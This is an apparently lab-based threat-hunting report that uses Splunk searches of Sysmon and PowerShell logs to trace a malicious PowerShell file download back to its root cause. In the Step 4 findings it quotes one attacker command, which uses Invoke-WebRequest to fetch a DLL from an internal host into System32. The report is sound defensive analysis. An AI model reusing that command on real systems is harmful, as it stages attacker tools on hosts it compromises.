# Hunting PowerShell Execution

## Overview

This report documents hunting for execution artifacts under the Execution tactic on the MITRE ATT&CK framework. The related technique is Command and Scripting Interpreter: PowerShell (T1059.001). I used Splunk to search Sysmon and PowerShell operational logs for evidence of PowerShell being used to carry out an attack, then traced the activity back to its root cause.

## Log Sources Available

- XmlWinEventLog:Application
- XmlWinEventLog:Microsoft-Windows-PowerShell/Operational
- XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
- XmlWinEventLog:Microsoft-Windows-Windows Defender/Operational
- XmlWinEventLog:Security
- XmlWinEventLog:System

## Investigation

### Step 1: Find process creation events

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
```

Queried Sysmon Event ID 1 to look for process creation events.

### Step 2: Narrow down to PowerShell processes

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
```

This surfaced three PowerShell binary paths:

- C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
- C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

![Screenshot placeholder: PowerShell process creation search results](screenshots/1a-powershell-process-search.png)

### Step 3: Cut out noise

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*\powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
| stats count by Image
```

I excluded the Splunk Universal Forwarder's PowerShell helper as expected noise, which left 6 events tied to `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`. A 32-bit PowerShell process running on a 64-bit host can be normal, but it's also worth flagging as suspicious depending on context.

### Step 4: Add fidelity to the events

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image=*\powershell.exe AND ParentImage!="C:\Windows\explorer.exe"
| table _time, user, Image, CommandLine, ParentImage, ParentCommandLine, IntegrityLevel
| sort -_time
```

![Screenshot placeholder: PowerShell events table with command lines and parent processes](screenshots/1a-powershell-events-table.png)

Most of the results traced back to `C:\Windows\System32\CompatTelRunner.exe` as the parent process, running a script that checks driver `.inf` files against a compatibility pattern. I researched this process and confirmed it is Microsoft's Compatibility Telemetry system, executed from its correct path — this activity looks like a legitimate compatibility scan rather than malicious behavior.

The final and most recent entry stood out from the rest:

```
powershell -c "Invoke-WebRequest -Uri hxxp://10[.]0[.]2[.]6/dghelper.dll -OutFile 'C:\Windows\System32\dghelper.dll'"
```

This is a PowerShell command downloading a DLL file from an external host — a strong indicator of tool transfer rather than a routine system process.

### Step 5: Confirm execution via PowerShell operational logs

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
EventID=4103
| stats count by Payload
```

This returned many results tied to the compatibility check noise, so I filtered it out:

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
EventID=4103
| where NOT like(Payload, "%inf%")
| stats count by Payload
```

![Screenshot placeholder: filtered PowerShell operational log payloads](screenshots/1a-powershell-payload-filtered.png)

This confirmed the `Invoke-WebRequest` call, its `-Uri` parameter pointing to `hxxp://10[.]0[.]2[.]6/dghelper[.]dll`, and its `-OutFile` parameter writing to `C:\Windows\System32\dghelper.dll`.

### Step 6: Confirm scope and network activity

```spl
index="aa15cbf9" dghelper.dll
```

Nine events referenced `dghelper.dll`, giving me a way to check whether other hosts had contact with the same file or infrastructure.

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=3 DestinationIp=10.0.2.6
```

This confirmed the outbound network connection to `10[.]0[.]2[.]6` over port 80.

## Key Findings

- The initial cluster of PowerShell activity from `CompatTelRunner.exe` is legitimate Microsoft compatibility telemetry, not malicious.
- A separate PowerShell command used `Invoke-WebRequest` to download `dghelper.dll` from `hxxp://10[.]0[.]2[.]6`, saving it to `C:\Windows\System32\`.
- The download was confirmed at the network layer, with a Sysmon Event ID 3 connection to `10[.]0[.]2[.]6` over port 80.
- The parent process of this PowerShell activity was `cmd.exe`, which became the starting point for the command-line hunt in the next report.

## Key Takeaways

- Not every PowerShell event is malicious — checking the parent process and the binary's file path helps separate normal system behavior from attacker activity.
- Filtering out known-noisy processes (like compatibility or telemetry scans) makes it much easier to spot the one command that matters.
- Correlating a suspicious command with network connection logs is what turns a suspicious PowerShell line into a confirmed indicator of compromise.

## Conclusion

I identified and confirmed a malicious PowerShell-based file download (T1059.001) by filtering Sysmon and PowerShell operational logs down to a single suspicious command and validating it against network connection events.
